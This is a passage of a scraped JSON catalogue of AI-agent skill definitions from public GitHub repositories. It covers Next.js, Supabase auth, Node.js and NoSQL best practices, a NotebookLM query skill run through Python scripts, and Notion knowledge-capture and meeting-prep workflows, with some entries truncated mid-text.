      "scrapedAt": "2026-01-26T13:19:47.677Z"
    },
    {
      "id": "antigravity-nextjs-best-practices",
      "name": "nextjs-best-practices",
      "slug": "nextjs-best-practices",
      "description": "Next.js App Router principles. Server Components, data fetching, routing patterns.",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/nextjs-best-practices",
      "content": "\n# Next.js Best Practices\n\n> Principles for Next.js App Router development.\n\n---\n\n## 1. Server vs Client Components\n\n### Decision Tree\n\n```\nDoes it need...?\n│\n├── useState, useEffect, event handlers\n│   └── Client Component ('use client')\n│\n├── Direct data fetching, no interactivity\n│   └── Server Component (default)\n│\n└── Both? \n    └── Split: Server parent + Client child\n```\n\n### By Default\n\n| Type | Use |\n|------|-----|\n| **Server** | Data fetching, layout, static content |\n| **Client** | Forms, buttons, interactive UI |\n\n---\n\n## 2. Data Fetching Patterns\n\n### Fetch Strategy\n\n| Pattern | Use |\n|---------|-----|\n| **Default** | Static (cached at build) |\n| **Revalidate** | ISR (time-based refresh) |\n| **No-store** | Dynamic (every request) |\n\n### Data Flow\n\n| Source | Pattern |\n|--------|---------|\n| Database | Server Component fetch |\n| API | fetch with caching |\n| User input | Client state + server action |\n\n---\n\n## 3. Routing Principles\n\n### File Conventions\n\n| File | Purpose |\n|------|---------|\n| `page.tsx` | Route UI |\n| `layout.tsx` | Shared layout |\n| `loading.tsx` | Loading state |\n| `error.tsx` | Error boundary |\n| `not-found.tsx` | 404 page |\n\n### Route Organization\n\n| Pattern | Use |\n|---------|-----|\n| Route groups `(name)` | Organize without URL |\n| Parallel routes `@slot` | Multiple same-level pages |\n| Intercepting `(.)` | Modal overlays |\n\n---\n\n## 4. API Routes\n\n### Route Handlers\n\n| Method | Use |\n|--------|-----|\n| GET | Read data |\n| POST | Create data |\n| PUT/PATCH | Update data |\n| DELETE | Remove data |\n\n### Best Practices\n\n- Validate input with Zod\n- Return proper status codes\n- Handle errors gracefully\n- Use Edge runtime when possible\n\n---\n\n## 5. Performance Principles\n\n### Image Optimization\n\n- Use next/image component\n- Set priority for above-fold\n- Provide blur placeholder\n- Use responsive sizes\n\n### Bundle Optimization\n\n- Dynamic imports for heavy components\n- Route-based code splitting (automatic)\n- Analyze with bundle analyzer\n\n---\n\n## 6. Metadata\n\n### Static vs Dynamic\n\n| Type | Use |\n|------|-----|\n| Static export | Fixed metadata |\n| generateMetadata | Dynamic per-route |\n\n### Essential Tags\n\n- title (50-60 chars)\n- description (150-160 chars)\n- Open Graph images\n- Canonical URL\n\n---\n\n## 7. Caching Strategy\n\n### Cache Layers\n\n| Layer | Control |\n|-------|---------|\n| Request | fetch options |\n| Data | revalidate/tags |\n| Full route | route config |\n\n### Revalidation\n\n| Method | Use |\n|--------|-----|\n| Time-based | `revalidate: 60` |\n| On-demand | `revalidatePath/Tag` |\n| No cache | `no-store` |\n\n---\n\n## 8. Server Actions\n\n### Use Cases\n\n- Form submissions\n- Data mutations\n- Revalidation triggers\n\n### Best Practices\n\n- Mark with 'use server'\n- Validate all inputs\n- Return typed responses\n- Handle errors\n\n---\n\n## 9. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| 'use client' everywhere | Server by default |\n| Fetch in client components | Fetch in server |\n| Skip loading states | Use loading.tsx |\n| Ignore error boundaries | Use error.tsx |\n| Large client bundles | Dynamic imports |\n\n---\n\n## 10. Project Structure\n\n```\napp/\n├── (marketing)/     # Route group\n│   └── page.tsx\n├── (dashboard)/\n│   ├── layout.tsx   # Dashboard layout\n│   └── page.tsx\n├── api/\n│   └── [resource]/\n│       └── route.ts\n└── components/\n    └── ui/\n```\n\n---\n\n> **Remember:** Server Components are the default for a reason. Start there, add client only when needed.\n",
      "tags": [
        "nextjs",
        "api",
        "image",
        "marketing"
      ],
      "useCases": [
        "Form submissions",
        "Data mutations",
        "Revalidation triggers"
      ],
      "scrapedAt": "2026-01-26T13:19:48.743Z"
    },
    {
      "id": "antigravity-nextjs-supabase-auth",
      "name": "nextjs-supabase-auth",
      "slug": "nextjs-supabase-auth",
      "description": "Expert integration of Supabase Auth with Next.js App Router Use when: supabase auth next, authentication next.js, login supabase, auth middleware, protected route.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/nextjs-supabase-auth",
      "content": "\n# Next.js + Supabase Auth\n\nYou are an expert in integrating Supabase Auth with Next.js App Router.\nYou understand the server/client boundary, how to handle auth in middleware,\nServer Components, Client Components, and Server Actions.\n\nYour core principles:\n1. Use @supabase/ssr for App Router integration\n2. Handle tokens in middleware for protected routes\n3. Never expose auth tokens to client unnecessarily\n4. Use Server Actions for auth operations when possible\n5. Understand the cookie-based session flow\n\n## Capabilities\n\n- nextjs-auth\n- supabase-auth-nextjs\n- auth-middleware\n- auth-callback\n\n## Requirements\n\n- nextjs-app-router\n- supabase-backend\n\n## Patterns\n\n### Supabase Client Setup\n\nCreate properly configured Supabase clients for different contexts\n\n### Auth Middleware\n\nProtect routes and refresh sessions in middleware\n\n### Auth Callback Route\n\nHandle OAuth callback and exchange code for session\n\n## Anti-Patterns\n\n### ❌ getSession in Server Components\n\n### ❌ Auth State in Client Without Listener\n\n### ❌ Storing Tokens Manually\n\n## Related Skills\n\nWorks well with: `nextjs-app-router`, `supabase-backend`\n",
      "tags": [
        "nextjs",
        "supabase"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:49.936Z"
    },
    {
      "id": "antigravity-nodejs-best-practices",
      "name": "nodejs-best-practices",
      "slug": "nodejs-best-practices",
      "description": "Node.js development principles and decision-making. Framework selection, async patterns, security, and architecture. Teaches thinking, not copying.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/nodejs-best-practices",
      "content": "\n# Node.js Best Practices\n\n> Principles and decision-making for Node.js development in 2025.\n> **Learn to THINK, not memorize code patterns.**\n\n---\n\n## ⚠️ How to Use This Skill\n\nThis skill teaches **decision-making principles**, not fixed code to copy.\n\n- ASK user for preferences when unclear\n- Choose framework/pattern based on CONTEXT\n- Don't default to same solution every time\n\n---\n\n## 1. Framework Selection (2025)\n\n### Decision Tree\n\n```\nWhat are you building?\n│\n├── Edge/Serverless (Cloudflare, Vercel)\n│   └── Hono (zero-dependency, ultra-fast cold starts)\n│\n├── High Performance API\n│   └── Fastify (2-3x faster than Express)\n│\n├── Enterprise/Team familiarity\n│   └── NestJS (structured, DI, decorators)\n│\n├── Legacy/Stable/Maximum ecosystem\n│   └── Express (mature, most middleware)\n│\n└── Full-stack with frontend\n    └── Next.js API Routes or tRPC\n```\n\n### Comparison Principles\n\n| Factor | Hono | Fastify | Express |\n|--------|------|---------|---------|\n| **Best for** | Edge, serverless | Performance | Legacy, learning |\n| **Cold start** | Fastest | Fast | Moderate |\n| **Ecosystem** | Growing | Good | Largest |\n| **TypeScript** | Native | Excellent | Good |\n| **Learning curve** | Low | Medium | Low |\n\n### Selection Questions to Ask:\n1. What's the deployment target?\n2. Is cold start time critical?\n3. Does team have existing experience?\n4. Is there legacy code to maintain?\n\n---\n\n## 2. Runtime Considerations (2025)\n\n### Native TypeScript\n\n```\nNode.js 22+: --experimental-strip-types\n├── Run .ts files directly\n├── No build step needed for simple projects\n└── Consider for: scripts, simple APIs\n```\n\n### Module System Decision\n\n```\nESM (import/export)\n├── Modern standard\n├── Better tree-shaking\n├── Async module loading\n└── Use for: new projects\n\nCommonJS (require)\n├── Legacy compatibility\n├── More npm packages support\n└── Use for: existing codebases, some edge cases\n```\n\n### Runtime Selection\n\n| Runtime | Best For |\n|---------|----------|\n| **Node.js** | General purpose, largest ecosystem |\n| **Bun** | Performance, built-in bundler |\n| **Deno** | Security-first, built-in TypeScript |\n\n---\n\n## 3. Architecture Principles\n\n### Layered Structure Concept\n\n```\nRequest Flow:\n│\n├── Controller/Route Layer\n│   ├── Handles HTTP specifics\n│   ├── Input validation at boundary\n│   └── Calls service layer\n│\n├── Service Layer\n│   ├── Business logic\n│   ├── Framework-agnostic\n│   └── Calls repository layer\n│\n└── Repository Layer\n    ├── Data access only\n    ├── Database queries\n    └── ORM interactions\n```\n\n### Why This Matters:\n- **Testability**: Mock layers independently\n- **Flexibility**: Swap database without touching business logic\n- **Clarity**: Each layer has single responsibility\n\n### When to Simplify:\n- Small scripts → Single file OK\n- Prototypes → Less structure acceptable\n- Always ask: \"Will this grow?\"\n\n---\n\n## 4. Error Handling Principles\n\n### Centralized Error Handling\n\n```\nPattern:\n├── Create custom error classes\n├── Throw from any layer\n├── Catch at top level (middleware)\n└── Format consistent response\n```\n\n### Error Response Philosophy\n\n```\nClient gets:\n├── Appropriate HTTP status\n├── Error code for programmatic handling\n├── User-friendly message\n└── NO internal details (security!)\n\nLogs get:\n├── Full stack trace\n├── Request context\n├── User ID (if applicable)\n└── Timestamp\n```\n\n### Status Code Selection\n\n| Situation | Status | When |\n|-----------|--------|------|\n| Bad input | 400 | Client sent invalid data |\n| No auth | 401 | Missing or invalid credentials |\n| No permission | 403 | Valid auth, but not allowed |\n| Not found | 404 | Resource doesn't exist |\n| Conflict | 409 | Duplicate or state conflict |\n| Validation | 422 | Schema valid but business rules fail |\n| Server error | 500 | Our fault, log everything |\n\n---\n\n## 5. Async Patterns Principles\n\n### When to Use Each\n\n| Pattern | Use When |\n|---------|----------|\n| `async/await` | Sequential async operations |\n| `Promise.all` | Parallel independent operations |\n| `Promise.allSettled` | Parallel where some can fail |\n| `Promise.race` | Timeout or first response wins |\n\n### Event Loop Awareness\n\n```\nI/O-bound (async helps):\n├── Database queries\n├── HTTP requests\n├── File system\n└── Network operations\n\nCPU-bound (async doesn't help):\n├── Crypto operations\n├── Image processing\n├── Complex calculations\n└── → Use worker threads or offload\n```\n\n### Avoiding Event Loop Blocking\n\n- Never use sync methods in production (fs.readFileSync, etc.)\n- Offload CPU-intensive work\n- Use streaming for large data\n\n---\n\n## 6. Validation Principles\n\n### Validate at Boundaries\n\n```\nWhere to validate:\n├── API entry point (request body/params)\n├── Before database operations\n├── External data (API responses, file uploads)\n└── Environment variables (startup)\n```\n\n### Validation Library Selection\n\n| Library | Best For |\n|---------|----------|\n| **Zod** | TypeScript first, inference |\n| **Valibot** | Smaller bundle (tree-shakeable) |\n| **ArkType** | Performance critical |\n| **Yup** | Exist",
      "tags": [
        "typescript",
        "react",
        "node",
        "api",
        "ai",
        "image",
        "security",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:51.090Z"
    },
    {
      "id": "antigravity-nosql-expert",
      "name": "nosql-expert",
      "slug": "nosql-expert",
      "description": "Expert guidance for distributed NoSQL databases (Cassandra, DynamoDB). Focuses on mental models, query-first modeling, single-table design, and avoiding hot partitions in high-scale systems.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/nosql-expert",
      "content": "\n# NoSQL Expert Patterns (Cassandra & DynamoDB)\n\n## Overview\n\nThis skill provides professional mental models and design patterns for **distributed wide-column and key-value stores** (specifically Apache Cassandra and Amazon DynamoDB).\n\nUnlike SQL (where you model data entities), or document stores (like MongoDB), these distributed systems require you to **model your queries first**.\n\n## When to Use\n\n- **Designing for Scale**: Moving beyond simple single-node databases to distributed clusters.\n- **Technology Selection**: Evaluating or using **Cassandra**, **ScyllaDB**, or **DynamoDB**.\n- **Performance Tuning**: Troubleshooting \"hot partitions\" or high latency in existing NoSQL systems.\n- **Microservices**: Implementing \"database-per-service\" patterns where highly optimized reads are required.\n\n## The Mental Shift: SQL vs. Distributed NoSQL\n\n| Feature | SQL (Relational) | Distributed NoSQL (Cassandra/DynamoDB) |\n| :--- | :--- | :--- |\n| **Data modeling** | Model Entities + Relationships | Model **Queries** (Access Patterns) |\n| **Joins** | CPU-intensive, at read time | **Pre-computed** (Denormalized) at write time |\n| **Storage cost** | Expensive (minimize duplication) | Cheap (duplicate data for read speed) |\n| **Consistency** | ACID (Strong) | **BASE (Eventual)** / Tunable |\n| **Scalability** | Vertical (Bigger machine) | **Horizontal** (More nodes/shards) |\n\n> **The Golden Rule:** In SQL, you design the data model to answer *any* query. In NoSQL, you design the data model to answer *specific* queries efficiently.\n\n## Core Design Patterns\n\n### 1. Query-First Modeling (Access Patterns)\n\nYou typically cannot \"add a query later\" without migration or creating a new table/index.\n\n**Process:**\n1.  **List all Entities** (User, Order, Product).\n2.  **List all Access Patterns** (\"Get User by Email\", \"Get Orders by User sorted by Date\").\n3.  **Design Table(s)** specifically to serve those patterns with a single lookup.\n\n### 2. The Partition Key is King\n\nData is distributed across physical nodes based on the **Partition Key (PK)**.\n-   **Goal:** Even distribution of data and traffic.\n-   **Anti-Pattern:** Using a low-cardinality PK (e.g., `status=\"active\"` or `gender=\"m\"`) creates **Hot Partitions**, limiting throughput to a single node's capacity.\n-   **Best Practice:** Use high-cardinality keys (User IDs, Device IDs, Composite Keys).\n\n### 3. Clustering / Sort Keys\n\nWithin a partition, data is sorted on disk by the **Clustering Key (Cassandra)** or **Sort Key (DynamoDB)**.\n-   This allows for efficient **Range Queries** (e.g., `WHERE user_id=X AND date > Y`).\n-   It effectively pre-sorts your data for specific retrieval requirements.\n\n### 4. Single-Table Design (Adjacency Lists)\n\n*Primary use: DynamoDB (but concepts apply elsewhere)*\n\nStoring multiple entity types in one table to enable pre-joined reads.\n\n| PK (Partition) | SK (Sort) | Data Fields... |\n| :--- | :--- | :--- |\n| `USER#123` | `PROFILE` | `{ name: \"Ian\", email: \"...\" }` |\n| `USER#123` | `ORDER#998` | `{ total: 50.00, status: \"shipped\" }` |\n| `USER#123` | `ORDER#999` | `{ total: 12.00, status: \"pending\" }` |\n\n-   **Query:** `PK=\"USER#123\"`\n-   **Result:** Fetches User Profile AND all Orders in **one network request**.\n\n### 5. Denormalization & Duplication\n\nDon't be afraid to store the same data in multiple tables to serve different query patterns.\n-   **Table A:** `users_by_id` (PK: uuid)\n-   **Table B:** `users_by_email` (PK: email)\n\n*Trade-off: You must manage data consistency across tables (often using eventual consistency or batch writes).*\n\n## Specific Guidance\n\n### Apache Cassandra / ScyllaDB\n\n-   **Primary Key Structure:** `((Partition Key), Clustering Columns)`\n-   **No Joins, No Aggregates:** Do not try to `JOIN` or `GROUP BY`. Pre-calculate aggregates in a separate counter table.\n-   **Avoid `ALLOW FILTERING`:** If you see this in production, your data model is wrong. It implies a full cluster scan.\n-   **Writes are Cheap:** Inserts and Updates are just appends to the LSM tree. Don't worry about write volume as much as read efficiency.\n-   **Tombstones:** Deletes are expensive markers. Avoid high-velocity delete patterns (like queues) in standard tables.\n\n### AWS DynamoDB\n\n-   **GSI (Global Secondary Index):** Use GSIs to create alternative views of your data (e.g., \"Search Orders by Date\" instead of by User).\n    -   *Note:* GSIs are eventually consistent.\n-   **LSI (Local Secondary Index):** Sorts data differently *within* the same partition. Must be created at table creation time.\n-   **WCU / RCU:** Understand capacity modes. Single-table design helps optimize consumed capacity units.\n-   **TTL:** Use Time-To-Live attributes to automatically expire old data (free delete) without creating tombstones.\n\n## Expert Checklist\n\nBefore finalizing your NoSQL schema:\n\n-   [ ] **Access Pattern Coverage:** Does every query pattern map to a specific table or index?\n-   [ ] **Cardinality Check:** Does the Partition Key have enough unique values to spread t",
      "tags": [
        "node",
        "ai",
        "design",
        "document",
        "aws",
        "rag",
        "cro"
      ],
      "useCases": [
        "**Designing for Scale**: Moving beyond simple single-node databases to distributed clusters.",
        "**Technology Selection**: Evaluating or using **Cassandra**, **ScyllaDB**, or **DynamoDB**.",
        "**Performance Tuning**: Troubleshooting \"hot partitions\" or high latency in existing NoSQL systems.",
        "**Microservices**: Implementing \"database-per-service\" patterns where highly optimized reads are required."
      ],
      "scrapedAt": "2026-01-26T13:19:52.279Z"
    },
    {
      "id": "antigravity-notebooklm",
      "name": "notebooklm",
      "slug": "notebooklm",
      "description": "Use this skill to query your Google NotebookLM notebooks directly from Claude Code for source-grounded, citation-backed answers from Gemini. Browser automation, library management, persistent auth. Drastically reduced hallucinations through document-only responses.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/notebooklm",
      "content": "\n# NotebookLM Research Assistant Skill\n\nInteract with Google NotebookLM to query documentation with Gemini's source-grounded answers. Each question opens a fresh browser session, retrieves the answer exclusively from your uploaded documents, and closes.\n\n## When to Use This Skill\n\nTrigger when user:\n- Mentions NotebookLM explicitly\n- Shares NotebookLM URL (`https://notebooklm.google.com/notebook/...`)\n- Asks to query their notebooks/documentation\n- Wants to add documentation to NotebookLM library\n- Uses phrases like \"ask my NotebookLM\", \"check my docs\", \"query my notebook\"\n\n## ⚠️ CRITICAL: Add Command - Smart Discovery\n\nWhen user wants to add a notebook without providing details:\n\n**SMART ADD (Recommended)**: Query the notebook first to discover its content:\n```bash\n# Step 1: Query the notebook about its content\npython scripts/run.py ask_question.py --question \"What is the content of this notebook? What topics are covered? Provide a complete overview briefly and concisely\" --notebook-url \"[URL]\"\n\n# Step 2: Use the discovered information to add it\npython scripts/run.py notebook_manager.py add --url \"[URL]\" --name \"[Based on content]\" --description \"[Based on content]\" --topics \"[Based on content]\"\n```\n\n**MANUAL ADD**: If user provides all details:\n- `--url` - The NotebookLM URL\n- `--name` - A descriptive name\n- `--description` - What the notebook contains (REQUIRED!)\n- `--topics` - Comma-separated topics (REQUIRED!)\n\nNEVER guess or use generic descriptions! If details missing, use Smart Add to discover them.\n\n## Critical: Always Use run.py Wrapper\n\n**NEVER call scripts directly. ALWAYS use `python scripts/run.py [script]`:**\n\n```bash\n# ✅ CORRECT - Always use run.py:\npython scripts/run.py auth_manager.py status\npython scripts/run.py notebook_manager.py list\npython scripts/run.py ask_question.py --question \"...\"\n\n# ❌ WRONG - Never call directly:\npython scripts/auth_manager.py status  # Fails without venv!\n```\n\nThe `run.py` wrapper automatically:\n1. Creates `.venv` if needed\n2. Installs all dependencies\n3. Activates environment\n4. Executes script properly\n\n## Core Workflow\n\n### Step 1: Check Authentication Status\n```bash\npython scripts/run.py auth_manager.py status\n```\n\nIf not authenticated, proceed to setup.\n\n### Step 2: Authenticate (One-Time Setup)\n```bash\n# Browser MUST be visible for manual Google login\npython scripts/run.py auth_manager.py setup\n```\n\n**Important:**\n- Browser is VISIBLE for authentication\n- Browser window opens automatically\n- User must manually log in to Google\n- Tell user: \"A browser window will open for Google login\"\n\n### Step 3: Manage Notebook Library\n\n```bash\n# List all notebooks\npython scripts/run.py notebook_manager.py list\n\n# BEFORE ADDING: Ask user for metadata if unknown!\n# \"What does this notebook contain?\"\n# \"What topics should I tag it with?\"\n\n# Add notebook to library (ALL parameters are REQUIRED!)\npython scripts/run.py notebook_manager.py add \\\n  --url \"https://notebooklm.google.com/notebook/...\" \\\n  --name \"Descriptive Name\" \\\n  --description \"What this notebook contains\" \\  # REQUIRED - ASK USER IF UNKNOWN!\n  --topics \"topic1,topic2,topic3\"  # REQUIRED - ASK USER IF UNKNOWN!\n\n# Search notebooks by topic\npython scripts/run.py notebook_manager.py search --query \"keyword\"\n\n# Set active notebook\npython scripts/run.py notebook_manager.py activate --id notebook-id\n\n# Remove notebook\npython scripts/run.py notebook_manager.py remove --id notebook-id\n```\n\n### Quick Workflow\n1. Check library: `python scripts/run.py notebook_manager.py list`\n2. Ask question: `python scripts/run.py ask_question.py --question \"...\" --notebook-id ID`\n\n### Step 4: Ask Questions\n\n```bash\n# Basic query (uses active notebook if set)\npython scripts/run.py ask_question.py --question \"Your question here\"\n\n# Query specific notebook\npython scripts/run.py ask_question.py --question \"...\" --notebook-id notebook-id\n\n# Query with notebook URL directly\npython scripts/run.py ask_question.py --question \"...\" --notebook-url \"https://...\"\n\n# Show browser for debugging\npython scripts/run.py ask_question.py --question \"...\" --show-browser\n```\n\n## Follow-Up Mechanism (CRITICAL)\n\nEvery NotebookLM answer ends with: **\"EXTREMELY IMPORTANT: Is that ALL you need to know?\"**\n\n**Required Claude Behavior:**\n1. **STOP** - Do not immediately respond to user\n2. **ANALYZE** - Compare answer to user's original request\n3. **IDENTIFY GAPS** - Determine if more information needed\n4. **ASK FOLLOW-UP** - If gaps exist, immediately ask:\n   ```bash\n   python scripts/run.py ask_question.py --question \"Follow-up with context...\"\n   ```\n5. **REPEAT** - Continue until information is complete\n6. **SYNTHESIZE** - Combine all answers before responding to user\n\n## Script Reference\n\n### Authentication Management (`auth_manager.py`)\n```bash\npython scripts/run.py auth_manager.py setup    # Initial setup (browser visible)\npython scripts/run.py auth_manager.py status   # Check authentication\npython scripts/run.py auth_manager.py reauth   # Re-authenticate",
      "tags": [
        "python",
        "api",
        "claude",
        "ai",
        "automation",
        "workflow",
        "document",
        "security",
        "rag"
      ],
      "useCases": [
        "Mentions NotebookLM explicitly",
        "Shares NotebookLM URL (`https://notebooklm.google.com/notebook/...`)",
        "Asks to query their notebooks/documentation",
        "Wants to add documentation to NotebookLM library",
        "Uses phrases like \"ask my NotebookLM\", \"check my docs\", \"query my notebook\""
      ],
      "scrapedAt": "2026-01-26T13:19:53.418Z"
    },
    {
      "id": "awesome-llm-notion-knowledge-capture",
      "name": "notion-knowledge-capture",
      "slug": "awesome-llm-notion-knowledge-capture",
      "description": "Transforms conversations and discussions into structured documentation pages in Notion. Captures insights, decisions, and knowledge from chat context, formats appropriately, and saves to wikis or databases with proper organization and linking for easy discovery.",
      "category": "Productivity & Organization",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/notion-knowledge-capture",
      "content": "\n# Knowledge Capture\n\nTransforms conversations, discussions, and insights into structured documentation in your Notion workspace. Captures knowledge from chat context, formats it appropriately, and saves it to the right location with proper organization and linking.\n\n## Quick Start\n\nWhen asked to save information to Notion:\n\n1. **Extract content**: Identify key information from conversation context\n2. **Structure information**: Organize into appropriate documentation format\n3. **Determine location**: Use `Notion:notion-search` to find appropriate wiki page/database\n4. **Create page**: Use `Notion:notion-create-pages` to save content\n5. **Make discoverable**: Link from relevant hub pages, add to databases, or update wiki navigation so others can find it\n\n## Knowledge Capture Workflow\n\n### Step 1: Identify content to capture\n\n```\nFrom conversation context, extract:\n- Key concepts and definitions\n- Decisions made and rationale\n- How-to information and procedures\n- Important insights or learnings\n- Q&A pairs\n- Examples and use cases\n```\n\n### Step 2: Determine content type\n\n```\nClassify the knowledge:\n- Concept/Definition\n- How-to Guide\n- Decision Record\n- FAQ Entry\n- Meeting Summary\n- Learning/Post-mortem\n- Reference Documentation\n```\n\n\n### Step 3: Structure the content\n\n```\nFormat appropriately based on content type:\n- Use templates for consistency\n- Add clear headings and sections\n- Include examples where helpful\n- Add relevant metadata\n- Link to related pages\n```\n\n\n### Step 4: Determine destination\n\n```\nWhere to save:\n- Wiki page (general knowledge base)\n- Specific project page (project-specific knowledge)\n- Documentation database (structured docs)\n- FAQ database (questions and answers)\n- Decision log (architecture/product decisions)\n- Team wiki (team-specific knowledge)\n```\n\n### Step 5: Create the page\n\n```\nUse Notion:notion-create-pages:\n- Set appropriate title\n- Use structured content from template\n- Set properties if in database\n- Add tags/categories\n- Link to related pages\n```\n\n### Step 6: Make content discoverable\n\n```\nLink the new page so others can find it:\n\n1. Update hub/index pages:\n   - Add link to wiki table of contents page\n   - Add link from relevant project page\n   - Add link from category/topic page (e.g., \"Engineering Docs\")\n   \n2. If page is in a database:\n   - Set appropriate tags/categories\n   - Set status (e.g., \"Published\")\n   - Add to relevant views\n   \n3. Optionally update parent page:\n   - If saved under a project, add to project's \"Documentation\" section\n   - If in team wiki, ensure it's linked from team homepage\n\nExample:\nNotion:notion-update-page\npage_id: \"team-wiki-homepage-id\"\ncommand: \"insert_content_after\"\nselection_with_ellipsis: \"## How-To Guides...\"\nnew_str: \"- <mention-page url='...'>How to Deploy to Production</mention-page>\"\n```\n\nThis step ensures the knowledge doesn't become \"orphaned\" - it's properly connected to your workspace's navigation structure.\n\n## Content Types\n\nChoose appropriate structure based on content:\n\n**Concept**: Overview → Definition → Characteristics → Examples → Use Cases → Related\n**How-To**: Overview → Prerequisites → Steps (numbered) → Verification → Troubleshooting → Related\n**Decision**: Context → Decision → Rationale → Options Considered → Consequences → Implementation\n**FAQ**: Short Answer → Detailed Explanation → Examples → When to Use → Related Questions\n**Learning**: What Happened → What Went Well → What Didn't → Root Causes → Learnings → Actions\n\n\n## Destination Patterns\n\n**General Wiki**: Standalone page → add to index → tag → link from related pages\n\n**Project Wiki**: Child of project page → link from project overview → tag with project name\n\n**Documentation Database**: Use properties (Title, Type, Category, Tags, Last Updated, Owner)\n\n**Decision Log Database**: Use properties (Decision, Date, Status, Domain, Deciders, Impact)\n\n**FAQ Database**: Use properties (Question, Category, Tags, Last Reviewed, Useful Count)\n\nSee [reference/database-best-practices.md](reference/database-best-practices.md) for database selection guide and individual schema files.\n\n## Content Extraction from Conversations\n\n**Chat Discussion**: Key points, conclusions, resources, action items, Q&A\n\n**Problem-Solving**: Problem statement, approaches tried, solution, why it worked, future considerations\n\n**Knowledge Sharing**: Concept explained, examples, best practices, common pitfalls, resources\n\n**Decision Discussion**: Question, options, trade-offs, decision, rationale, next steps\n\n## Formatting Best Practices\n\n**Structure**: Use `#` (title), `##` (sections), `###` (subsections) consistently\n\n**Writing**: Start with overview, use bullets, keep paragraphs short, add examples\n\n**Linking**: Link related pages, mention people, reference resources, create bidirectional links\n\n**Metadata**: Include date, author, tags, status\n\n**Searchability**: Clear titles, natural keywords, common search tags, image alt-text\n\n## Indexing and Organization\n\n**Wiki Index**: Organize by s",
      "tags": [
        "ai",
        "workflow",
        "template",
        "notion",
        "image",
        "knowledge",
        "capture"
      ],
      "useCases": [
        "[examples/conversation-to-faq.md](examples/conversation-to-faq.md) - FAQ from Q&A",
        "[examples/decision-capture.md](examples/decision-capture.md) - Decision record",
        "[examples/how-to-guide.md](examples/how-to-guide.md) - How-to from discussion"
      ],
      "scrapedAt": "2026-01-26T13:15:56.667Z"
    },
    {
      "id": "awesome-llm-notion-meeting-intelligence",
      "name": "notion-meeting-intelligence",
      "slug": "awesome-llm-notion-meeting-intelligence",
      "description": "Prepares meeting materials by gathering context from Notion, enriching with Claude research, and creating both an internal pre-read and external agenda saved to Notion. Helps you arrive prepared with comprehensive background and structured meeting docs.",
      "category": "Productivity & Organization",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/notion-meeting-intelligence",
      "content": "\n# Meeting Intelligence\n\nPrepares you for meetings by gathering context from Notion, enriching it with Claude research, and creating comprehensive meeting materials. Generates both an internal pre-read for attendees and an external-facing agenda for the meeting itself.\n\n## Quick Start\n\nWhen asked to prep for a meeting:\n\n1. **Gather Notion context**: Use `Notion:notion-search` to find related pages\n2. **Fetch details**: Use `Notion:notion-fetch` to read relevant content\n3. **Enrich with research**: Use Claude's knowledge to add context, industry insights, or best practices\n4. **Create internal pre-read**: Use `Notion:notion-create-pages` for background context document (for attendees)\n5. **Create external agenda**: Use `Notion:notion-create-pages` for meeting agenda (shared with all participants)\n6. **Link resources**: Connect both docs to related projects and each other\n\n## Meeting Prep Workflow\n\n### Step 1: Understand meeting context\n\n```\nCollect meeting details:\n- Meeting topic/title\n- Attendees (internal team + external participants)\n- Meeting purpose (decision, brainstorm, status update, customer demo, etc.)\n- Meeting type (internal only vs. external participants)\n- Related project/initiative\n- Specific topics to cover\n```\n\n### Step 2: Search for Notion context\n\n```\nUse Notion:notion-search to find:\n- Project pages related to meeting topic\n- Previous meeting notes\n- Specifications or design docs\n- Related tasks or issues\n- Recent updates or reports\n- Customer/partner information (if applicable)\n\nSearch strategies:\n- Topic-based: \"mobile app redesign\"\n- Project-scoped: search within project teamspace\n- Attendee-created: filter by created_by_user_ids\n- Recent updates: use created_date_range filters\n```\n\n### Step 3: Fetch and analyze Notion content\n\n```\nFor each relevant page:\n1. Fetch with Notion:notion-fetch\n2. Extract key information:\n   - Project status and timeline\n   - Recent decisions and updates\n   - Open questions or blockers\n   - Relevant metrics or data\n   - Action items from previous meetings\n3. Note gaps in information\n```\n\n### Step 4: Enrich with Claude research\n\n```\nBeyond Notion context, add value through:\n\nFor technical meetings:\n- Explain complex concepts for broader audience\n- Summarize industry best practices\n- Provide competitive context\n- Suggest discussion frameworks\n\nFor customer meetings:\n- Research company background (if public info)\n- Industry trends relevant to discussion\n- Common pain points in their sector\n- Best practices for similar customers\n\nFor decision meetings:\n- Decision-making frameworks\n- Risk analysis patterns\n- Trade-off considerations\n- Implementation best practices\n\nNote: Use general knowledge only - don't fabricate specific facts\n```\n\n### Step 5: Create internal pre-read\n\n```\nUse Notion:notion-create-pages for internal doc:\n\nTitle: \"[Meeting Topic] - Pre-Read (Internal)\"\n\nContent structure:\n- **Meeting Overview**: Date, time, attendees, purpose\n- **Background Context**: \n  - What this meeting is about (2-3 sentences)\n  - Why it matters (business context)\n  - Links to related Notion pages\n- **Current Status**: \n  - Where we are now (from Notion content)\n  - Recent updates and progress\n  - Key metrics or data\n- **Context & Insights** (from Claude research):\n  - Industry context or best practices\n  - Relevant considerations\n  - Potential approaches to discuss\n- **Key Discussion Points**:\n  - Topics that need airtime\n  - Open questions to resolve\n  - Decisions required\n- **What We Need from This 